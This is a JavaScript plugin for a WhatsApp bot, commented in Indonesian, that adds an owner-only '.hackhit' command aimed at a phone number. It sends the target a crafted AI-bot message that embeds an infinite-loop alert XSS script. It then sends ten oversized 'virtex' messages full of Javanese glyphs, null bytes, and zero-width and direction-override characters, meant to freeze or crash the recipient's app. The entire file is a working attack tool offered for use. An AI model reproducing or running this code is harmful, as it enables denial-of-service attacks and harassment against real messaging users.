/**
 * PLUGIN: HACKHIT
 * Ultimate Fix: Type safety & Clear error logging
 */

import crypto from 'crypto'
import fs from 'fs'
import path from 'path'

const pluginConfig = {
    name: 'hackhit',
    alias: ['hh', 'hit'],
    category: 'owner',
    description: '💀 HackHit - XSS & Delay Bug',
    usage: '.hackhit <nomor>',
    example: '.hackhit 62857xxxxxxx',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 30,
    energi: 10,
    isEnabled: true
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

// ═══════════════════════════════════════════════════════════════
// FUNGSI DELAY INVISIBLE
// ═══════════════════════════════════════════════════════════════
async function DelayInvisible(sock, target) {
    const d = (ms) => new Promise(r => setTimeout(r, ms));

    const stikerPath = path.resolve("./media/stiker.webp");
    const stikerBuffer = fs.existsSync(stikerPath) ? fs.readFileSync(stikerPath) : null;

    const virtex =
        "ꦾꦿ꧀ꦱꦺꦴꦭꦸTꦶꦎꦤ꧀ꦏꦿ꧀ꦲꦺꦴꦮ꦳ꦺꦂꦮ꧀ꦭ꧀ꦝ꧀ꦠ꧀ꦤ꧀ꦥ꧀ꦧ꧀ꦩ꧀ꦪ꧀ꦫ꧀ꦭ꧀ꦮ꧀ꦱ꧀ꦲ꧀" +
        "ꦀꦁꦂꦃꦄꦅꦆꦇꦈꦉꦊꦋꦌꦍꦎꦏꦐꦑꦒꦓꦔꦕꦖꦗꦘꦙꦚꦛꦜꦝꦞꦟ" +
        "ꦴꦵꦶꦷꦸꦹꦺꦻꦼꦽꦾꦿ꧀꧁꧂꧃꧄꧅꧆꧇꧈꧉꧊꧋꧌꧍";

    const payload = virtex.repeat(3000)
        + "\u0000".repeat(50000)
        + "\u200B\u200C\u200D\u2060\uFEFF".repeat(5000)
        + "\u200E\u202E\u200F".repeat(2000);

    console.log(`\x1b[33m[HACKHIT]\x1b[0m 🕒 Memulai Delay Invisible (10x loop)...`);

    for (let i = 0; i < 10; i++) {
        try {
            await sock.relayMessage(target, {
                extendedTextMessage: {
                    text: payload,
                    matchedText: "\u0000",
                    font: 6,
                    previewType: 0,
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: false,
                        expiration: 86400,
                        ephemeralExpiration: 86400
                    }
                }
            }, {
                noSelfSync: true,
                messageId: "3EB0" + Date.now().toString(16).toUpperCase() + Math.floor(Math.random() * 999999).toString(16)
            });

            if (stikerBuffer && typeof sock.sendMessage === 'function') {
                try { await sock.sendMessage(target, { sticker: stikerBuffer }) } catch {}
            }

            console.log(`\x1b[32m[HACKHIT]\x1b[0m ✅ Delay Loop ${i + 1}/10 terkirim`);
            await d(1000);

        } catch (e) {
            await d(1000);
        }
    }
    console.log(`\x1b[36m[HACKHIT]\x1b[0m 🏁 Delay Invisible Selesai.`);
}

// ═══════════════════════════════════════════════════════════════
// FUNGSI HACKHIT (XSS)
// ═══════════════════════════════════════════════════════════════
async function HackHit(sock, target) {
  console.log(`\x1b[35m[HACKHIT]\x1b[0m 🚀 Mengirim XSS Payload...`);
  
  let N = await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{ messageType: 1, messageText: " " }],
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "867051314767696@bot" },
            forwardOrigin: 4,
            botMessageSharingInfo: { botEntryPointOrigin: 1, forwardScore: 1 }
          }
        }
      }
    }
  }, { noSelfSync: true });

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: { remoteJid: target, fromMe: true, id: N },
          type: 14,
          editedMessage: {
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  submessages: [{ messageType: 1, messageText: " " }],
                  contextInfo: {
                    forwardingScore: 1, isForwarded: true,
                    forwardedAiBotMessageInfo: { botJid: "867051314767696@bot" },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }
        }
      }
    }
  }, { noSelfSync: true })

  await sleep(1000)

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: { remoteJid: target, fromMe: true, id: N },
          type: 14,
          editedMessage: {
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify({
                      __typename: "GenAIUnifiedResponse",
                      response_id: crypto.randomUUID(),
                      sections: [{
                        __typename: "GenAIUnifiedResponseSection",
                        view_model: {
                          __typename: "GenAISingleLayoutViewModel",
                          primitive: {
                            __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                            trusted_sources: [],
                            payload: `<script>while (true) { alert("Hacking By MakLo"); }</script>`  
                          }
                        }
                      }]
                    })).toString("base64")
                  },
                  contextInfo: {
                    isForwarded: true, forwardingScore: 1,
                    forwardedAiBotMessageInfo: { botJid: "867051314767696@bot" },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }
        }
      }
    }
  }, { noSelfSync: true })
  
  console.log(`\x1b[32m[HACKHIT]\x1b[0m ✅ XSS Payload Terkirim!`);
  return true;
}

// ═══════════════════════════════════════════════════════════════
// HANDLER UTAMA
// ═══════════════════════════════════════════════════════════════
async function handler(m, { sock }) {
    // 1. Pastikan socket aman
    let conn = sock || m.conn || m.client || global.conn || global.sock;
    if (!conn) {
        console.log('\x1b[31m[HACKHIT] Error: Socket tidak ditemukan!\x1b[0m');
        return;
    }

    // 2. Ekstrak Nomor dengan Aman
    let args = m.args || [];
    if (args.length === 0 && m.text) {
        args = String(m.text).trim().split(/\s+/).slice(1);
    }
    
    let rawNumber = args[0];
    if (!rawNumber) {
        console.log('\x1b[31m[HACKHIT] Error: Masukkan nomor target!\x1b[0m');
        return;
    }

    // Paksa jadi string dan bersihkan
    let phone = String(rawNumber).replace(/[^0-9]/g, '');
    if (!phone || phone.length < 10) {
        console.log('\x1b[31m[HACKHIT] Error: Nomor tidak valid!\x1b[0m');
        return;
    }

    // 3. Bikin Target JID
    const target = `${phone}@s.whatsapp.net`;

    // 4. Cek apakah relayMessage beneran fungsi (Biar gak error "is not a function")
    if (typeof conn.relayMessage !== 'function') {
        console.log(`\x1b[31m[HACKHIT] Fatal Error: conn.relayMessage is ${typeof conn.relayMessage}, bukan function!\x1b[0m`);
        return;
    }

    // 5. Eksekusi di luar try-catch handler biar gak ganggu proses bot
    HackHit(conn, target).then(() => {
        return DelayInvisible(conn, target);
    }).then(() => {
        console.log(`\x1b[36m[HACKHIT]\x1b[0m 🏁 Semua proses bug ke ${phone} telah selesai.`);
    }).catch((e) => {
        console.error(`\x1b[31m[HACKHIT] Gagal mengeksekusi bug: ${e.message}\x1b[0m`);
    });

    return; // Langsung selesai, biar bot gak pending
}

export { pluginConfig as config, handler }